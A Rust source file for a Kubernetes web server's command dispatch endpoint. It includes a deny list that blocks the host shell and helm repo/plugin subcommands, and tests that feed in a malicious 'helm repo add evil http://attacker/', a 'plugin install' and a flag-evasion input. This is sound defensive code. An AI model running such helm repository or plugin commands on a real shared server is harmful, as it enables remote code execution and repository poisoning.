//! POST /api/command/:command — the streaming command surface, mirroring the
//! desktop's Tauri streaming commands. Start commands wire a per-user `WsSink`
//! into the caller's stream managers; events flow out over `/api/ws`.

use std::sync::Arc;

use axum::extract::{Path, State};
use axum::http::StatusCode;
use axum::response::{IntoResponse, Response};
use axum::{Extension, Json};
use serde::Deserialize;
use serde_json::{json, Value};

use crate::auth::session::UserCtx;
use crate::users::UserEnv;
use crate::ws::hub::WsSink;
use crate::AppState;

use srelens_streams::exec::ExecOpts;
use srelens_streams::logs::LogTarget;

fn error(status: StatusCode, message: &str) -> Response {
    (status, Json(json!({ "error": message }))).into_response()
}

/// Streaming commands with no safe multi-user form on the shared web server.
/// `start_terminal` spawns a shell on the container host (not a pod) with the
/// server's own environment — any authenticated user would get code execution
/// as the shared UID and could read every other user's materialized
/// kubeconfigs and sealed tokens. Web users get the RBAC-scoped in-pod
/// `start_pod_exec` terminal instead; the host shell stays desktop-only.
pub const WEB_DENIED_COMMANDS: &[&str] = &["start_terminal"];

/// Helm subcommands with no safe multi-user form on the shared server:
/// `plugin install <url>` downloads and runs code (RCE as the shared UID) and
/// `repo add`/`repo update` write shared repository state a later helmInstall
/// would trust. The other operations (install/upgrade/rollback/uninstall/
/// template/list/get/…) stay allowed and run against per-user `HELM_*` dirs.
pub const HELM_DENIED_SUBCOMMANDS: &[&str] = &["repo", "plugin"];

/// True if a helm arg vector must be refused on the web surface. The web UI
/// always sends the subcommand as the first token, so that token is the
/// subcommand helm will run. A leading flag (which the UI never sends) is
/// refused too: `helm --flag repo add …` would otherwise run `repo add` while
/// slipping past a first-token check.
pub fn helm_args_denied(args: &[String]) -> bool {
    match args.first().map(String::as_str) {
        Some(first) if first.starts_with('-') => true,
        Some(first) => HELM_DENIED_SUBCOMMANDS.contains(&first),
        None => false,
    }
}

/// Map a stream-start error to a response: a cluster-login-required marker (the
/// context is OIDC-protected with no valid token) becomes a 401 the frontend
/// can act on; anything else is a 502 (cluster unreachable, RBAC, etc.).
fn command_error(err_msg: &str) -> Response {
    crate::api::maybe_cluster_login_response(err_msg)
        .unwrap_or_else(|| error(StatusCode::BAD_GATEWAY, err_msg))
}

fn ok(value: Value) -> Response {
    (StatusCode::OK, Json(value)).into_response()
}

/// Parse the request body into the command's typed args.
// Response carries the full Body enum; boxing the error for a 400-only path
// isn't worth rippling `?` through every call site — the size is inherent.
#[allow(clippy::result_large_err)]
fn parse<T: for<'de> Deserialize<'de>>(body: &Value) -> Result<T, Response> {
    serde_json::from_value(body.clone()).map_err(|e| {
        error(
            StatusCode::BAD_REQUEST,
            &format!("invalid command args: {e}"),
        )
    })
}

pub async fn dispatch(
    State(state): State<AppState>,
    Extension(user): Extension<UserCtx>,
    Path(command): Path<String>,
    body: axum::body::Bytes,
) -> Response {
    if WEB_DENIED_COMMANDS.contains(&command.as_str()) {
        return error(StatusCode::FORBIDDEN, "command not available in web mode");
    }

    let args: Value = if body.is_empty() {
        json!({})
    } else {
        match serde_json::from_slice(&body) {
            Ok(v) => v,
            Err(e) => return error(StatusCode::BAD_REQUEST, &format!("body is not JSON: {e}")),
        }
    };

    let env = match state
        .user_envs
        .env_for(&state.db, &state.master_key, user.user_id)
        .await
    {
        Ok(env) => env,
        Err(e) => return error(StatusCode::INTERNAL_SERVER_ERROR, &e),
    };
    let sink = || {
        Arc::new(WsSink {
            hub: state.ws_hub.clone(),
            user_id: user.user_id,
        })
    };

    match run(&command, &args, &env, &sink).await {
        Ok(resp) => resp,
        Err(resp) => resp,
    }
}

// Arg structs — field names match the desktop Tauri command parameters.
#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct WatchStart {
    context: String,
    namespace: String,
    kind: String,
    channel: String,
}
#[derive(Deserialize)]
struct ChannelArg {
    channel: String,
}
#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct LogStart {
    context: String,
    namespace: String,
    targets: Vec<LogTarget>,
    channel: String,
    #[serde(default)]
    timestamps: Option<bool>,
    #[serde(default)]
    since_seconds: Option<i64>,
    #[serde(default)]
    tail_lines: Option<i64>,
}
#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct ExecStart {
    context: String,
    namespace: String,
    pod: String,
    #[serde(default)]
    container: Option<String>,
    #[serde(default)]
    shell: Option<String>,
    #[serde(default)]
    command: Option<Vec<String>>,
    #[serde(default)]
    cols: Option<u16>,
    #[serde(default)]
    rows: Option<u16>,
}
#[derive(Deserialize)]
struct SessionArg {
    session: u64,
}
#[derive(Deserialize)]
struct InputArg {
    session: u64,
    data: String,
}
#[derive(Deserialize)]
struct ResizeArg {
    session: u64,
    cols: u16,
    rows: u16,
}
#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct ForwardStart {
    context: String,
    namespace: String,
    kind: String,
    name: String,
    remote_port: u16,
    #[serde(default)]
    local_port: Option<u16>,
}
#[derive(Deserialize)]
struct IdArg {
    id: u64,
}
#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct TerminalStart {
    context: String,
    channel: String,
    #[serde(default)]
    cols: Option<u16>,
    #[serde(default)]
    rows: Option<u16>,
}
#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct HelmStart {
    context: String,
    args: Vec<String>,
    values: String,
    channel: String,
}

async fn run(
    command: &str,
    body: &Value,
    env: &Arc<UserEnv>,
    sink: &impl Fn() -> Arc<WsSink>,
) -> Result<Response, Response> {
    let paths = env.paths.clone();
    let out = match command {
        "start_resource_watch" => {
            let a: WatchStart = parse(body)?;
            let channel = env
                .streams
                .watch
                .start(sink(), a.context, a.namespace, a.kind, a.channel, paths)
                .await
                .map_err(|e| command_error(&e))?;
            json!(channel)
        }
        "stop_watch" => {
            let a: ChannelArg = parse(body)?;
            env.streams.watch.stop(&a.channel);
            json!(null)
        }
        "start_log_stream" => {
            let a: LogStart = parse(body)?;
            env.streams
                .logs
                .start(
                    sink(),
                    a.context,
                    a.namespace,
                    a.targets,
                    a.channel,
                    a.timestamps,
                    a.since_seconds,
                    a.tail_lines,
                )
                .await
                .map_err(|e| command_error(&e))?;
            json!(null)
        }
        "stop_log_stream" => {
            let a: ChannelArg = parse(body)?;
            env.streams.logs.stop(&a.channel);
            json!(null)
        }
        "start_pod_exec" => {
            let a: ExecStart = parse(body)?;
            let id = env
                .streams
                .exec
                .start(
                    sink(),
                    a.context,
                    a.namespace,
                    a.pod,
                    ExecOpts {
                        container: a.container,
                        shell: a.shell,
                        command: a.command,
                        cols: a.cols,
                        rows: a.rows,
                    },
                )
                .await
                .map_err(|e| command_error(&e))?;
            json!(id)
        }
        "exec_input" => {
            let a: InputArg = parse(body)?;
            env.streams.exec.input(a.session, a.data).await;
            json!(null)
        }
        "exec_resize" => {
            let a: ResizeArg = parse(body)?;
            env.streams.exec.resize(a.session, a.cols, a.rows).await;
            json!(null)
        }
        "exec_close" => {
            let a: SessionArg = parse(body)?;
            env.streams.exec.close(a.session);
            json!(null)
        }
        "start_port_forward" => {
            let a: ForwardStart = parse(body)?;
            let info = env
                .streams
                .forward
                .start(
                    sink(),
                    a.context,
                    a.namespace,
                    a.kind,
                    a.name,
                    a.remote_port,
                    a.local_port,
                )
                .await
                .map_err(|e| command_error(&e))?;
            json!({ "id": info.id, "localPort": info.local_port })
        }
        "stop_port_forward" => {
            let a: IdArg = parse(body)?;
            env.streams.forward.stop(a.id);
            json!(null)
        }
        "start_terminal" => {
            let a: TerminalStart = parse(body)?;
            let id = env
                .streams
                .terminal
                .start(sink(), a.context, paths, a.channel, a.cols, a.rows)
                .await
                .map_err(|e| command_error(&e))?;
            json!(id)
        }
        "terminal_input" => {
            let a: InputArg = parse(body)?;
            env.streams.terminal.input(a.session, &a.data);
            json!(null)
        }
        "terminal_resize" => {
            let a: ResizeArg = parse(body)?;
            env.streams.terminal.resize(a.session, a.cols, a.rows);
            json!(null)
        }
        "terminal_close" => {
            let a: SessionArg = parse(body)?;
            env.streams.terminal.close(a.session);
            json!(null)
        }
        "start_helm_op" => {
            let a: HelmStart = parse(body)?;
            if helm_args_denied(&a.args) {
                return Err(error(
                    StatusCode::FORBIDDEN,
                    "helm repo/plugin operations are not available in web mode",
                ));
            }
            let id = env
                .streams
                .helm
                .start(
                    sink(),
                    a.context,
                    paths,
                    a.args,
                    a.values,
                    a.channel,
                    Some(env.helm_home.clone()),
                )
                .await
                .map_err(|e| command_error(&e))?;
            json!(id)
        }
        "helm_op_close" => {
            let a: SessionArg = parse(body)?;
            env.streams.helm.close(a.session);
            json!(null)
        }
        other => {
            return Err(error(
                StatusCode::NOT_FOUND,
                &format!("unknown command: {other}"),
            ))
        }
    };
    Ok(ok(out))
}

#[cfg(test)]
mod tests {
    use super::helm_args_denied;
    use crate::{router, AppState};
    use axum::body::Body;
    use axum::http::{Request, StatusCode};
    use serde_json::json;
    use srelens_capability::Registry;
    use std::sync::Arc;
    use tower::ServiceExt;

    async fn authed_post(
        state: &AppState,
        command: &str,
        body: serde_json::Value,
    ) -> (StatusCode, serde_json::Value) {
        let user = state.db.upsert_user("i", "s", "u@x", "U", 1).await.unwrap();
        let token = state
            .db
            .create_session(user.id, crate::unix_now())
            .await
            .unwrap();
        let resp = router(state.clone())
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri(format!("/api/command/{command}"))
                    .header("content-type", "application/json")
                    .header("cookie", format!("srelens_session={token}"))
                    .header("x-srelens-csrf", "1")
                    .body(Body::from(body.to_string()))
                    .unwrap(),
            )
            .await
            .unwrap();
        let status = resp.status();
        let bytes = axum::body::to_bytes(resp.into_body(), 64 * 1024)
            .await
            .unwrap();
        let v = if bytes.is_empty() {
            json!(null)
        } else {
            serde_json::from_slice(&bytes).unwrap()
        };
        (status, v)
    }

    #[tokio::test]
    async fn unknown_command_is_404() {
        let state = AppState::for_tests(Arc::new(Registry::new())).await;
        let (status, body) = authed_post(&state, "nope", json!({})).await;
        assert_eq!(status, StatusCode::NOT_FOUND);
        assert!(body["error"]
            .as_str()
            .unwrap()
            .starts_with("unknown command"));
    }

    #[tokio::test]
    async fn watch_start_dispatches_and_returns_channel() {
        // Empty kubeconfigs → the watch task starts (returns the channel) and
        // later emits an error frame; the command itself succeeds with the
        // channel echoed back.
        let state = AppState::for_tests(Arc::new(Registry::new())).await;
        let (status, body) = authed_post(
            &state,
            "start_resource_watch",
            json!({ "context": "c", "namespace": "n", "kind": "pods", "channel": "watch:1" }),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(body, json!("watch:1"));
    }

    #[tokio::test]
    async fn void_command_returns_null() {
        let state = AppState::for_tests(Arc::new(Registry::new())).await;
        let (status, body) = authed_post(&state, "stop_watch", json!({ "channel": "x" })).await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(body, json!(null));
    }

    #[tokio::test]
    async fn exec_start_returns_a_bare_session_id() {
        let state = AppState::for_tests(Arc::new(Registry::new())).await;
        let (status, body) = authed_post(
            &state,
            "start_pod_exec",
            json!({ "context": "c", "namespace": "n", "pod": "p" }),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
        assert!(
            body.is_number(),
            "exec session id must be a bare number (desktop parity), got {body}"
        );
    }

    #[tokio::test]
    async fn host_terminal_is_denied_in_web_mode() {
        // The host shell has no safe shared-UID form; web users get the in-pod
        // exec terminal instead. The deny must short-circuit with 403 before the
        // command ever spawns a shell.
        let state = AppState::for_tests(Arc::new(Registry::new())).await;
        let (status, body) = authed_post(
            &state,
            "start_terminal",
            json!({ "context": "c", "channel": "term:1" }),
        )
        .await;
        assert_eq!(status, StatusCode::FORBIDDEN);
        assert_eq!(body["error"], json!("command not available in web mode"));
    }

    #[test]
    fn helm_guard_blocks_repo_plugin_and_leading_flags_only() {
        // Denied: repo/plugin subcommands, and any leading flag (an evasion the
        // UI never emits — `--flag repo add` would slip a denied subcommand
        // past a first-token check).
        for args in [
            vec!["repo".into(), "add".into(), "x".into(), "http://e".into()],
            vec!["plugin".into(), "install".into(), "http://e".into()],
            vec!["--namespace".into(), "x".into(), "repo".into(), "add".into()],
        ] {
            assert!(helm_args_denied(&args), "must deny: {args:?}");
        }
        // Allowed: the operations the UI actually sends, all subcommand-first.
        for args in [
            vec!["install".into(), "r".into(), "c".into()],
            vec!["upgrade".into(), "r".into(), "c".into()],
            vec!["rollback".into(), "r".into(), "1".into()],
            vec!["uninstall".into(), "r".into()],
            vec![], // `helm` with no args just prints help
        ] {
            assert!(!helm_args_denied(&args), "must allow: {args:?}");
        }
    }

    #[tokio::test]
    async fn helm_repo_op_is_denied_in_web_mode() {
        // A malicious `helm repo add` (shared-repo poisoning) must be refused
        // with 403 before the helm subprocess ever spawns.
        let state = AppState::for_tests(Arc::new(Registry::new())).await;
        let (status, body) = authed_post(
            &state,
            "start_helm_op",
            json!({
                "context": "c",
                "args": ["repo", "add", "evil", "http://attacker/"],
                "values": "",
                "channel": "helm:1"
            }),
        )
        .await;
        assert_eq!(status, StatusCode::FORBIDDEN);
        assert_eq!(
            body["error"],
            json!("helm repo/plugin operations are not available in web mode")
        );
    }

    #[tokio::test]
    async fn command_requires_auth() {
        let state = AppState::for_tests(Arc::new(Registry::new())).await;
        let resp = router(state)
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri("/api/command/stop_watch")
                    .header("x-srelens-csrf", "1")
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
    }
}
